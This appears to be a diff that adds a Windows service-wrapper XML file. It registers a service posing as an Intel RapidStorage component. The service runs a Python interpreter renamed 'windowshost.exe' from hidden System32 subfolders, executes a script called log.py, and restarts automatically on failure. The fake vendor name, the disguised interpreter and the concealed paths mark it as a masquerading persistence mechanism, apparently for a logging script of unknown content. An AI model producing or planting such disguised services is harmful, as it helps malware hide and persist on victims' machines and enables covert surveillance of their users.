@@ -1,0 +1,13 @@
+<service>
+  <id>IntelRsService</id>
+  <name>Intel(R) RapidStorage Find Service</name>
+  <description>Intel(R) RapidStorage Find Service</description>
+
+  <executable>C:\Windows\System32\re-as\WPy64\windowshost.exe</executable>
+  <arguments>C:\Windows\System32\ap32\log.py</arguments>
+
+  <workingdirectory>C:\Windows\System32\ap32</workingdirectory>
+
+  <onfailure action="restart" delay="5 sec" />
+</service>
+
